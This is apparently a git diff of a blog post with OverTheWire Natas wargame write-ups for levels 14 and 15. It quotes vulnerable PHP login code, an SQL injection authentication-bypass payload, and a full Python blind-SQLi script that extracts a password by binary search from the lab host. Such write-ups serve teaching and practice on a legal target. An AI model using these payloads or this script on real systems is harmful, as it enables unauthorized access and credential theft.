@@ -2,7 +2,7 @@
 layout: post
 title: OverTheWire - Natas Solutions 11 - 15
 date: 2025-04-27
-categories: [OverTheWire, natas, Web, Encryption, XOR, Known-Plaintext Attack]
+categories: [OverTheWire, natas, Web, Encryption, XOR, Known-Plaintext Attack, SQLi]
 ---
 # Natas Solutions
 
@@ -185,9 +185,9 @@ Natas teaches the basics of serverside web-security. Each level contains its own
 
 ---
 
-## Level 12 --> Level 13
-**URL**: http://natas12.natas.labs.overthewire.org  
-**Username**: natas12  
+## Level 13 --> Level 14
+**URL**: http://natas13.natas.labs.overthewire.org  
+**Username**: natas13 
 **Password**: [REDACTED]
 
 #### Solution
@@ -263,5 +263,157 @@ Natas teaches the basics of serverside web-security. Each level contains its own
    ![Pwned](/assets/img/overthewire/natas11_15/natas13_4.png)
 
 **Password for Level 14**: [REDACTED]
+
+---
+
+
+### Level 14 --> Level 15
+**URL**: http://natas14.natas.labs.overthewire.org  
+**Username**: natas14  
+**Password**: [REDACTED]
+
+#### Solution
+
+1. Upon accessing the webpage, I encountered a user login form and a button to view the source code.
+   ![Login](/assets/img/overthewire/natas11_15/natas14_1.png)
+
+2. Reviewing the source code revealed that user inputs were not sanitized, and prepared statements were not utilized, making the application vulnerable to SQL Injection (SQLi).
+
+   ```php
+   <?php
+   if(array_key_exists("username", $_REQUEST)) {
+       $link = mysqli_connect('localhost', 'natas14', '<censored>');
+       mysqli_select_db($link, 'natas14');
+
+       $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+       if(array_key_exists("debug", $_GET)) {
+           echo "Executing query: $query<br>";
+       }
+
+       if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+               echo "Successful login! The password for natas15 is <censored><br>";
+       } else {
+               echo "Access denied!<br>";
+       }
+       mysqli_close($link);
+   } else {
+   ?>
+   ```
+
+3. Knowing the existing usernames, I crafted an SQLi payload: `localhost" OR 1=1 #`. This payload exploits the lack of input sanitization to bypass authentication. I used URL-Encoding so I was able to send the GET-Request in BurpSuite ;).
+
+4. Executing the payload successfully logged me in and revealed the password for the next level.
+   ![Pwned](/assets/img/overthewire/natas11_15/natas14_2.png)
+
+**Password for Level 15**: [REDACTED]
+
+---
+
+### Level 15 --> Level 16
+**URL**: http://natas15.natas.labs.overthewire.org  
+**Username**: natas15  
+**Password**: [REDACTED]
+
+#### Solution
+
+1. Upon accessing the natas15 page, I was presented with a form to check if a user exists.
+   ![User Exist Window](/assets/img/overthewire/natas11_15/natas15_2.png)
+
+2. I attempted a SQL injection (SQLi) attack to test the system's response. The application returned "This user exists." for certain inputs and "Error in query." for others.
+   ![This user Exists](/assets/img/overthewire/natas11_15/natas15_3.png)
+   ![Error in Query](/assets/img/overthewire/natas11_15/natas15_4.png)
+
+3. By examining the source code, I identified a vulnerability that allowed for a Blind SQL Injection attack. Blind SQLi is a type of SQL injection where the attacker can infer information from the database based on the application's response, even though the actual data is not directly visible. This is possible because the application provides different responses based on whether a query returns results or not.
+
+   ```php
+   <?php
+
+   /*
+   CREATE TABLE `users` (
+     `username` varchar(64) DEFAULT NULL,
+     `password` varchar(64) DEFAULT NULL
+   );
+   */
+
+   if(array_key_exists("username", $_REQUEST)) {
+       $link = mysqli_connect('localhost', 'natas15', '<censored>');
+       mysqli_select_db($link, 'natas15');
+
+       $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+       if(array_key_exists("debug", $_GET)) {
+           echo "Executing query: $query<br>";
+       }
+
+       $res = mysqli_query($link, $query);
+       if($res) {
+           if(mysqli_num_rows($res) > 0) {
+               echo "This user exists.<br>";
+           } else {
+               echo "This user doesn't exist.<br>";
+           }
+       } else {
+           echo "Error in query.<br>";
+       }
+
+       mysqli_close($link);
+   } else {
+   ?>
+   ```
+
+4. The code above shows that the application checks if a user exists by evaluating `mysqli_num_rows($res) > 0`. This behavior can be exploited to perform a Blind SQLi attack, as the application provides different responses based on the query result.
+
+5. I developed a Python script to automate the extraction of the password using a binary search technique through Blind SQLi. The script iteratively guesses each character of the password by sending payloads that check if the ASCII value of a character is greater than a certain value. 
+   
+   > **_NOTE:_**
+   > Using binary search, the correct ASCII character is identified in approximately 6-7 requests per character, as log₂(95) rounds to this range.
+   > Overall, this method requires around 200 requests, significantly reducing the number from over 2,000 needed for a brute-force approach.
+
+   ```python
+   import requests
+   import string
+   import time
+
+   url = "http://natas15.natas.labs.overthewire.org/index.php"
+   auth = ("natas15", "REDACTED") 
+   headers = {
+       "Content-Type": "application/x-www-form-urlencoded",
+       "User-Agent": "Mozilla/5.0",
+   }
+
+   min_ascii = 32
+   max_ascii = 126
+
+   def extract_password():
+       known = ""
+       for pos in range(1, 33):  # other passwords were 32 chars long
+           low, high = min_ascii, max_ascii
+           print(f"[ ] Position {pos}: ", end='', flush=True)
+
+           while low <= high:
+               mid = (low + high) // 2
+               payload = f'natas16" AND ASCII(SUBSTRING(password,{pos},1)) > {mid} #'
+               data = {"username": payload}
+               r = requests.post(url, auth=auth, headers=headers, data=data)
+
+               if "This user exists." in r.text:
+                   low = mid + 1
+               else:
+                   high = mid - 1
+
+           found_char = chr(low)
+           known += found_char
+           print(f"{found_char} => {known}")
+       return known
+
+   if __name__ == "__main__":
+       print("[*] Extracting password using binary SQLi...")
+       password = extract_password()
+       print(f"\n[+] Final password: {password}")
+   ```
+
+6. Running the script revealed the password for the next level by determining each characters position and value. Pretty cool challenge :).
+   ![Terminal Log](/assets/img/overthewire/natas11_15/natas15_1.png)
+   
+   ![Pwned](/assets/img/overthewire/natas11_15/natas15_5.png)
 
 ---
